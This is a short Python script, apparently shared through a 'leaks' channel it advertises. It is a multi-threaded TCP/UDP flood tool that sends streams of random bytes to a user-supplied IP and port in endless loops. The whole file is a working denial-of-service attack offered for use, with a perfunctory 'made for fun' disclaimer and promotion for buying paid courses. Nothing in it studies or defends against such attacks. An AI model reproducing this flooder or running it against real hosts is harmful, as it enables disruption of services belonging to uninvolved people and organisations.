import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())
#print("\033[1;31mTHIS IS MADE BY @VIP_SRC_BGMI_GL_KR\033[0m")
 #   print("\033[1;31mMUST JOIN OUR CHANNEL FOR MORE LEAKS\033[0m")
#    print("")
 #   print("\033[1;31mThis tool is made for only fun i am not responsible for any action \n dm to buy paid couse and for more leaks @@VIP_SRC_BGMI_GL_KR!")
    
print("--> JOIN @VIP_SRC_BGMI_GL_KR <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack done ✅!!!")
		except:
			print("[!] Attack fail 😭!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[@VIP_SRC_BGMI_GL_KR]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack done ✅!!!")
		except:
			s.close()
			print("[*] Attack fail 😭!!!")
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
